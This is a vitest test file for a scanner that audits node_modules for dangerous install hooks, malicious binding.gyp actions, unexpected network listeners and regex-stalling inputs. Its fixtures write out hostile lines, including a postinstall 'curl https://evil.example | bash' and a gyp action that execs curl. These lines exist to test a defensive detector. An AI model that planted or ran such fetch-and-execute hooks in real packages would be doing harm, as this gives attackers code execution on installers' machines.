import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

const SCANNER = new URL('./scan-node-modules.mjs', import.meta.url).pathname;

function runScan(root) {
  const r = spawnSync(process.execPath, [SCANNER, '--root', root, '--json', '--fail-on', 'none'], {
    encoding: 'utf8',
    maxBuffer: 10 * 1024 * 1024,
  });
  const out = r.stdout || '';
  const jsonStart = out.indexOf('{');
  const report = JSON.parse(out.slice(jsonStart));
  return { status: r.status, report };
}

describe('scan-node-modules', () => {
  /**
   * The `createServer(<handler>)` detector is a hand-written scan rather than a
   * regex, because the regex form is the ambiguous shape detect-unsafe-regex
   * rejects and this scanner reads attacker-chosen source. These pin the forms
   * it must keep catching, the ones it must not claim, and that a hostile input
   * cannot stall it.
   */
  it('detects every shape of createServer request handler', () => {
    const root = join(tmpdir(), `fox-deps-scan-handler-${Date.now()}`);
    const nm = join(root, 'node_modules');
    const forms = {
      'paren-arrow': 'module.exports = createServer((req, res) => {});\n',
      'async-arrow': 'module.exports = createServer(async (req, res) => {});\n',
      'async-no-space': 'module.exports = createServer(async(req, res) => {});\n',
      'bare-param': 'module.exports = createServer(req => {});\n',
      'spaced': 'module.exports = createServer( ( req, res ) => {});\n',
    };
    for (const [name, src] of Object.entries(forms)) {
      mkdirSync(join(nm, name), { recursive: true });
      writeFileSync(join(nm, name, 'package.json'), JSON.stringify({ name }));
      writeFileSync(join(nm, name, 'index.js'), src);
    }

    try {
      const { report } = runScan(root);
      const flagged = new Set(
        report.findings.filter((f) => f.kind === 'unexpected-server-listen').map((f) => f.package)
      );
      for (const name of Object.keys(forms)) {
        expect(flagged.has(name), `${name} should be flagged`).toBe(true);
      }
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('does not claim a createServer call that takes something else', () => {
    const root = join(tmpdir(), `fox-deps-scan-nohandler-${Date.now()}`);
    const nm = join(root, 'node_modules');
    mkdirSync(join(nm, 'quiet-pkg'), { recursive: true });
    writeFileSync(join(nm, 'quiet-pkg', 'package.json'), JSON.stringify({ name: 'quiet-pkg' }));
    // `createServer(socket` is not a request handler, and `asyncronous` must not
    // read as the optional `async` keyword followed by junk.
    writeFileSync(
      join(nm, 'quiet-pkg', 'index.js'),
      'const s = createServer(socket);\nconst t = createServer(asyncronous);\n'
    );

    try {
      const { report } = runScan(root);
      expect(
        report.findings.some(
          (f) => f.package === 'quiet-pkg' && f.kind === 'unexpected-server-listen'
        )
      ).toBe(false);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('is not stalled by a source file built to backtrack', () => {
    const root = join(tmpdir(), `fox-deps-scan-redos-${Date.now()}`);
    const nm = join(root, 'node_modules');
    mkdirSync(join(nm, 'hostile-pkg'), { recursive: true });
    writeFileSync(join(nm, 'hostile-pkg', 'package.json'), JSON.stringify({ name: 'hostile-pkg' }));
    // The input that makes an ambiguous whitespace regex explode: a very long
    // run the engine can split between its optional groups in many ways, with
    // no match at the end.
    writeFileSync(
      join(nm, 'hostile-pkg', 'index.js'),
      `createServer(${' '.repeat(100_000)}x);\n` +
        `.listen(${'PORT'.repeat(5_000)});\n` +
        `socket.connect(${'a'.repeat(50_000)});\n`
    );

    try {
      const started = Date.now();
      const { report } = runScan(root);
      const elapsed = Date.now() - started;
      // Generous: the whole scan spawns a process. A backtracking blow-up does
      // not come in slightly over budget, it does not come back.
      expect(elapsed).toBeLessThan(20_000);
      expect(Array.isArray(report.findings)).toBe(true);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('flags dangerous lifecycle scripts and unexpected listeners', () => {
    const root = join(tmpdir(), `fox-deps-scan-${Date.now()}`);
    const nm = join(root, 'node_modules');
    mkdirSync(join(nm, 'evil-pkg'), { recursive: true });
    writeFileSync(
      join(nm, 'evil-pkg', 'package.json'),
      JSON.stringify({
        name: 'evil-pkg',
        scripts: { postinstall: 'curl https://evil.example | bash' },
      })
    );
    writeFileSync(join(nm, 'evil-pkg', 'index.js'), 'require("http").createServer().listen(4444);\n');

    mkdirSync(join(nm, 'express'), { recursive: true });
    writeFileSync(join(nm, 'express', 'package.json'), JSON.stringify({ name: 'express' }));
    writeFileSync(join(nm, 'express', 'index.js'), 'require("http").createServer().listen(3000);\n');

    try {
      const { report } = runScan(root);
      const kinds = report.findings.map((f) => f.kind);
      expect(kinds).toContain('dangerous-lifecycle-script');
      expect(kinds).toContain('unexpected-server-listen');
      expect(report.findings.some((f) => f.package === 'express' && f.kind === 'unexpected-server-listen')).toBe(
        false
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('scans nested deps (lifecycle + listen) with the nested package name', () => {
    const root = join(tmpdir(), `fox-deps-nested-${Date.now()}`);
    const parent = join(root, 'node_modules', 'express');
    const nested = join(parent, 'node_modules', 'evil-nested');
    mkdirSync(nested, { recursive: true });
    writeFileSync(join(parent, 'package.json'), JSON.stringify({ name: 'express' }));
    writeFileSync(join(parent, 'index.js'), 'module.exports = {};\n');
    writeFileSync(
      join(nested, 'package.json'),
      JSON.stringify({
        name: 'evil-nested',
        scripts: { postinstall: 'curl https://evil.example | bash' },
      })
    );
    writeFileSync(join(nested, 'index.js'), 'require("http").createServer().listen(9999);\n');

    try {
      const { report } = runScan(root);
      expect(
        report.findings.some(
          (f) => f.package === 'evil-nested' && f.kind === 'dangerous-lifecycle-script'
        )
      ).toBe(true);
      expect(
        report.findings.some(
          (f) => f.package === 'evil-nested' && f.kind === 'unexpected-server-listen'
        )
      ).toBe(true);
      // Must not attribute the nested listener to the allowlisted parent
      expect(
        report.findings.some(
          (f) => f.package === 'express' && f.kind === 'unexpected-server-listen'
        )
      ).toBe(false);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('flags Phantom-Gyp style binding.gyp but not better-sqlite3-style hooks', () => {
    const root = join(tmpdir(), `fox-deps-gyp-${Date.now()}`);
    const bad = join(root, 'node_modules', 'bad-native');
    const good = join(root, 'node_modules', 'good-native');
    mkdirSync(bad, { recursive: true });
    mkdirSync(good, { recursive: true });
    writeFileSync(join(bad, 'package.json'), JSON.stringify({ name: 'bad-native' }));
    writeFileSync(
      join(bad, 'binding.gyp'),
      `{ "targets": [{ "target_name": "x", "actions": [{ "action": ["node", "-e", "require('child_process').exec('curl https://x')"] }] }] }`
    );
    writeFileSync(join(good, 'package.json'), JSON.stringify({ name: 'good-native' }));
    writeFileSync(
      join(good, 'binding.gyp'),
      `{ "variables": { "prebuild_exists%": "<!(node lib/binding.js)" }, "targets": [] }`
    );

    try {
      const { report } = runScan(root);
      expect(report.findings.some((f) => f.package === 'bad-native' && f.kind === 'malicious-binding-gyp')).toBe(
        true
      );
      expect(report.findings.some((f) => f.package === 'good-native')).toBe(false);
    } finally {
      if (existsSync(root)) rmSync(root, { recursive: true, force: true });
    }
  });
});
